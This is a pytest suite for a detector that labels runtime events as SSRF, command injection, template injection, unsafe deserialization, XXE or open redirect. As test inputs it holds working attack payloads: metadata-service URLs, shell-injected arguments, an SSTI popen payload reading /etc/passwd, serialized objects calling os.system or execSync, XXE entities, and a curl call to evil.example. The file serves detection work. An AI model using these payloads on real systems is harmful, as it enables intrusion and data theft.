"""Input -> effect oracles (shadow/effects.py): each class fires only when the request's own input reaches the effect."""
import base64

from shadow import effects

REQ = {"headers": {"host": "shop.example"}, "body": b""}
RESP = {"status": 200, "headers": {}, "body": b""}


def net(address, port, **kw):
    return {"oracle": "net", "detail": {"family": "AF_INET", "address": address, "port": port, "syscall": "connect", **kw},
            "stack": [{"file": "app.py", "line": 7, "func": "fetch"}]}


def proc(*argv, **kw):
    return {"oracle": "proc", "detail": {"path": argv[0], "argv": list(argv), **kw}, "stack": []}


def file(path):
    return {"oracle": "file", "detail": {"path": path, "realpath": path}, "stack": []}


def kinds(events):
    return [e["oracle"] for e in events]


def run(events, ins, request=REQ, response=RESP):
    return effects.refine(events, ins, request, response)


# ------------------------------------------------------------------ hosts
def test_canonical_hosts():
    assert effects.canon("HTTP-Host.Example.") == "http-host.example"
    assert effects.canon("[::1]") == "::1"
    assert effects.canon("::ffff:127.0.0.1") == "127.0.0.1"
    assert effects.canon("2130706433") == "127.0.0.1"          # decimal
    assert effects.canon("0x7f000001") == "127.0.0.1"          # hex
    assert effects.canon("0177.0.0.1") == "127.0.0.1"          # octal
    assert effects.canon("127.1") == "127.0.0.1"               # short


def test_hosts_an_input_names():
    assert effects.hosts_of("http://169.254.169.254/latest/meta-data") == [("169.254.169.254", None)]
    assert effects.hosts_of("https://internal.example:8443/x") == [("internal.example", 8443)]
    assert effects.hosts_of("//cdn.example/a") == [("cdn.example", None)]
    assert effects.hosts_of("http://[::1]:8080/") == [("::1", 8080)]
    assert effects.hosts_of("10.0.0.5:81") == [("10.0.0.5", 81)]                   # bare host:port
    assert effects.hosts_of("see http://a.example/x and http://b.example") == [("a.example", None), ("b.example", None)]
    assert effects.hosts_of("just some text with spaces") == []
    assert effects.hosts_of("abc", urls_only=True) == []


# ------------------------------------------------------------------ ssrf
def test_ssrf_when_the_destination_is_the_host_the_request_named():
    out = run([net("169.254.169.254", 80)], [("query", "url", "http://169.254.169.254/latest/meta-data")])
    assert kinds(out) == ["ssrf"]
    d = out[0]["detail"]
    assert (d["input"], d["param"], d["location"], d["matched"]) == ("http://169.254.169.254/latest/meta-data", "url", "query", "address")
    assert d["address"] == "169.254.169.254" and out[0]["stack"][0]["func"] == "fetch"    # the stack survives


def test_ssrf_sees_through_numeric_and_ipv6_spellings():
    assert kinds(run([net("127.0.0.1", 6379)], [("query", "u", "http://2130706433:6379/")])) == ["ssrf"]
    assert kinds(run([net("::1", 8080, family="AF_INET6")], [("json", "cb", "http://[::1]:8080/hook")])) == ["ssrf"]


def test_ssrf_needs_the_port_to_agree_when_the_request_gave_one():
    assert kinds(run([net("10.0.0.5", 80)], [("query", "u", "http://10.0.0.5:81/")])) == ["net"]
    assert kinds(run([net("10.0.0.5", 80)], [("query", "u", "http://10.0.0.5/")])) == ["ssrf"]


def test_ssrf_by_name_through_the_dns_query():
    # the sidecar sees the DNS lookup; with the question name it is exact, without it the request must name a URL
    named = run([net("10.0.0.2", 53, qname="internal.example")], [("query", "u", "http://internal.example/admin")])
    assert kinds(named) == ["ssrf"]
    anon = run([net("10.0.0.2", 53)], [("query", "u", "http://internal.example/admin")])
    assert kinds(anon) == ["ssrf"] and anon[0]["detail"]["matched"] == "dns"
    assert kinds(run([net("10.0.0.2", 53)], [("query", "u", "http://10.0.0.5/")])) == ["net"]       # an IP needs no lookup
    assert kinds(run([net("10.0.0.2", 53)], [("query", "q", "internal")])) == ["net"]               # a bare word is not a URL


def test_in_process_net_event_uses_the_looked_up_host():
    ev = {"oracle": "net", "detail": {"event": "socket.getaddrinfo", "address": "('internal.example', 80)",
                                      "host": "internal.example", "port": 80}, "stack": []}
    assert kinds(run([ev], [("query", "u", "http://internal.example/")])) == ["ssrf"]


def test_unrelated_egress_stays_a_plain_net_event():
    assert kinds(run([net("93.184.216.34", 443)], [("query", "q", "hello"), ("query", "u", "http://other.example/")])) == ["net"]


# ------------------------------------------------------------------ cmdi
def test_cmdi_when_the_input_is_on_the_command_line():
    out = run([proc("/bin/sh", "-c", "ping -c1 x; id")], [("query", "host", "x; id")])
    assert kinds(out) == ["cmdi"]
    d = out[0]["detail"]
    assert d["param"] == "host" and d["input"] == "x; id" and d["metachar"] is True and d["argv"][-1] == "ping -c1 x; id"


def test_cmdi_needs_the_input_to_be_there_and_long_enough():
    assert kinds(run([proc("/bin/sh", "-c", "date")], [("query", "host", "x; id")])) == ["proc"]    # not reflected
    assert kinds(run([proc("/bin/sh", "-c", "ls -l")], [("query", "n", "ls")])) == ["proc"]         # 2 chars match anything
    assert kinds(run([proc("/usr/bin/convert", "in.png", "out.png")], [("query", "size", "100x100")])) == ["proc"]


def test_short_inputs_only_match_as_whole_words():
    # "id" inside "uid=..." or "/bin/sh" is not the id command; as its own argument it is
    assert kinds(run([proc("/bin/sh", "-c", "echo uid=1000")], [("query", "x", "id=")])) == ["proc"]
    assert kinds(run([proc("/usr/bin/tool", "--grid", "7")], [("query", "x", "rid")])) == ["proc"]
    assert kinds(run([proc("/bin/sh", "-c", "id")], [("query", "x", "{{ f('id') }}")])) == ["ssti"]
    assert kinds(run([proc("/bin/sh", "-c", "echo uid")], [("query", "x", "{{ f('id') }}")])) == ["proc"]
    assert effects._contains("ping -c1 host.example", "host.example") is True             # long: substring
    assert effects._contains("a\0-c\0id", "id") is True and effects._contains("uid", "id") is False


def test_cmdi_without_metacharacters_is_still_argument_injection():
    out = run([proc("/usr/bin/curl", "--output", "/tmp/x", "http://evil.example")], [("query", "u", "--output")])
    assert kinds(out) == ["cmdi"] and out[0]["detail"]["metachar"] is False


# ------------------------------------------------------------------ ssti
def test_ssti_canary_the_response_holds_the_product_not_the_expression():
    body = b"<h1>Hello 8281</h1>"
    out = run([], [("query", "name", "{{ 91*91 }}")], response={**RESP, "body": body})
    assert kinds(out) == ["ssti"]
    d = out[0]["detail"]
    assert (d["expression"], d["evaluated"], d["observed"], d["param"]) == ("{{ 91*91 }}", "8281", "response", "name")
    for probe in ("${91*91}", "<%= 91*91 %>", "#{91*91}", "{{91*91}}"):
        assert kinds(run([], [("query", "n", probe)], response={**RESP, "body": body})) == ["ssti"], probe


def test_ssti_canary_negatives():
    probe = [("query", "name", "{{ 91*91 }}")]
    assert run([], probe, response={**RESP, "body": b"Hello {{ 91*91 }}"}) == []           # echoed unevaluated: safe
    assert run([], probe, response={**RESP, "body": b"Hello 8281 and {{ 91*91 }}"}) == []   # the expression is there too
    assert run([], probe, response={**RESP, "body": b"Hello world"}) == []                   # nothing evaluated
    assert run([], [("query", "n", "{{7*7}}")], response={**RESP, "body": b"49 results"}) == []   # a small product is noise
    assert run([], [("query", "n", "{{ 91*91 }} 8281")], response={**RESP, "body": b"8281"}) == []  # the input carried it
    assert run([], [("query", "n", "91*91")], response={**RESP, "body": b"8281"}) == []     # not inside template delimiters


def test_ssti_effect_a_literal_inside_the_expression_reaches_the_effect():
    expr = "{{ cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}"
    out = run([proc("/bin/sh", "-c", "cat /etc/passwd")], [("query", "name", expr)])
    assert kinds(out) == ["ssti"] and out[0]["detail"]["literal"] == "cat /etc/passwd"
    out = run([file("/etc/passwd")], [("query", "name", "{{ open('/etc/passwd').read() }}")])
    assert kinds(out) == ["ssti"]
    # the same effects without a template around the input are not template injection
    assert kinds(run([proc("/bin/sh", "-c", "cat /etc/passwd")], [("query", "name", "cat /etc/passwd")])) == ["cmdi"]
    assert kinds(run([file("/etc/passwd")], [("query", "name", "/etc/passwd")])) == ["file"]


# ------------------------------------------------------------------ deser
def b64(raw: bytes) -> str:
    return base64.b64encode(raw).decode()


def test_deser_when_a_process_is_spawned_while_the_request_carries_a_serialized_object():
    pickle_b64 = b64(b"\x80\x04\x95\x20\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94")
    out = run([proc("/bin/sh", "-c", "id")], [("form", "session", pickle_b64)])
    assert kinds(out) == ["deser"] and out[0]["detail"]["format"] == "pickle"
    java = b64(b"\xac\xed\x00\x05sr\x00\x11java.util.HashMap")
    assert run([proc("/bin/sh", "-c", "id")], [("body", "body", java)])[0]["detail"]["format"] == "java"
    assert run([proc("/bin/sh", "-c", "id")], [("cookie", "s", 'O:8:"stdClass":0:{}')])[0]["detail"]["format"] == "php"
    yml = "!!python/object/apply:os.system ['id']"
    assert run([proc("/bin/sh", "-c", "id")], [("body", "body", yml)])[0]["detail"]["format"] == "yaml"


def test_deser_text_formats_inside_a_base64_wrapper():
    node = b64(b'{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'id\')}"}')
    out = run([proc("/bin/sh", "-c", "id")], [("query", "obj", node)])
    assert kinds(out) == ["deser"] and out[0]["detail"]["format"] == "nodejs"
    php = b64(b'O:8:"stdClass":1:{s:1:"a";s:2:"id";}')
    assert run([proc("/bin/sh", "-c", "id")], [("query", "o", php)])[0]["detail"]["format"] == "php"
    plain = b64(b'{"name":"Ana","note":"nothing serialized in here at all"}')
    assert kinds(run([proc("/bin/sh", "-c", "id")], [("query", "o", plain)])) == ["proc"]


def test_deser_elsewhere_needs_the_object_to_name_the_effect():
    java = b64(b"\xac\xed\x00\x05sr\x00\x0fjava.net.URL http://10.9.9.9/x")
    named = run([net("10.9.9.9", 80)], [("body", "body", java)])
    assert kinds(named) == ["deser"] and named[0]["detail"]["correlated"] is True
    other = run([net("93.184.216.34", 80)], [("body", "body", java)])
    assert kinds(other) == ["net"]


def test_ordinary_base64_is_not_a_serialized_object():
    assert kinds(run([proc("/bin/sh", "-c", "id")], [("query", "token", b64(b"hello world, nothing to see"))])) == ["proc"]


# ------------------------------------------------------------------ xxe
XML = {"headers": {"host": "shop.example", "content-type": "application/xml"}, "body":
       b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'}


def test_xxe_the_declared_external_entity_was_fetched():
    out = run([file("/etc/passwd")], [("body", "body", XML["body"].decode())], request=XML)
    assert kinds(out) == ["xxe"] and out[0]["detail"]["entity"] == "file:///etc/passwd"
    net_req = {**XML, "body": b'<!DOCTYPE r [<!ENTITY x SYSTEM "http://10.1.1.1:8000/e.dtd">]><r>&x;</r>'}
    assert kinds(run([net("10.1.1.1", 8000)], [], request=net_req)) == ["xxe"]
    dtd_req = {**XML, "body": b'<!DOCTYPE r SYSTEM "http://10.1.1.1/evil.dtd"><r/>'}
    assert kinds(run([net("10.1.1.1", 80)], [], request=dtd_req)) == ["xxe"]
    php_req = {**XML, "body": b'<!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><r/>'}
    assert kinds(run([file("/etc/passwd")], [], request=php_req)) == ["xxe"]


def test_xxe_negatives():
    assert kinds(run([file("/etc/hostname")], [], request=XML)) == ["file"]                     # another file
    plain = {**XML, "body": b"<r><name>x</name></r>"}
    assert kinds(run([file("/etc/passwd")], [], request=plain)) == ["file"]                     # no external entity
    assert kinds(run([net("10.9.9.9", 80)], [], request={**XML, "body": XML["body"]})) == ["net"]
    assert kinds(run([file("/etc/passwd")], [], request={"headers": {}, "body": b"/etc/passwd"})) == ["file"]   # not XML


# ------------------------------------------------------------------ redirect
def redirect(location, status=302):
    return {"status": status, "headers": {"location": location}, "body": b""}


def test_redirect_to_a_host_the_request_named():
    out = run([], [("query", "next", "https://evil.example/login")], response=redirect("https://evil.example/login"))
    assert kinds(out) == ["redirect"]
    d = out[0]["detail"]
    assert (d["host"], d["status"], d["param"], d["location"]) == ("evil.example", 302, "next", "query")
    for loc in ("//evil.example/x", "/\\evil.example/x", "HTTPS://EVIL.example/"):
        assert kinds(run([], [("query", "next", loc.replace("\\", "/"))], response=redirect(loc))) == ["redirect"], loc
    assert kinds(run([], [("query", "n", "https://evil.example")], response=redirect("https://evil.example", 307))) == ["redirect"]


def test_redirect_negatives():
    ins = [("query", "next", "https://evil.example/login")]
    assert run([], ins, response=redirect("/home")) == []                                        # relative
    assert run([], ins, response=redirect("https://shop.example/home")) == []                    # same host
    assert run([], ins, response=redirect("https://sso.corp.example/auth")) == []                # external, not from the input
    assert run([], ins, response={"status": 200, "headers": {"location": "https://evil.example/login"}, "body": b""}) == []
    assert run([], [("query", "q", "ab")], response=redirect("https://ab.example/")) == []       # a 2 char input is noise


# ------------------------------------------------------------------ refine as a whole
def test_other_events_pass_through_and_the_function_is_idempotent():
    sql = {"oracle": "sql", "detail": {"statement": "SELECT 1", "input": "x"}, "stack": []}
    owner = {"oracle": "owner", "detail": {"marker_owner": 2}, "stack": []}
    events = [sql, owner, net("169.254.169.254", 80), proc("/bin/sh", "-c", "x; id")]
    ins = [("query", "url", "http://169.254.169.254/"), ("query", "h", "x; id")]
    once = run(events, ins)
    assert kinds(once) == ["sql", "owner", "ssrf", "cmdi"] and once[0] is sql and once[1] is owner
    assert run(once, ins) == once                                  # refined events are not refined again
    assert kinds(events) == ["sql", "owner", "net", "proc"]        # and the input list was not mutated


def test_a_broken_input_never_loses_the_events():
    events = [net("169.254.169.254", 80)]
    assert effects.refine(events, [("query", "u", None), ("x",)], REQ, RESP) == events
    assert effects.refine(events, [("query", "u", "http://a")], None, None) == events
    assert effects.refine([], [], REQ, RESP) == []
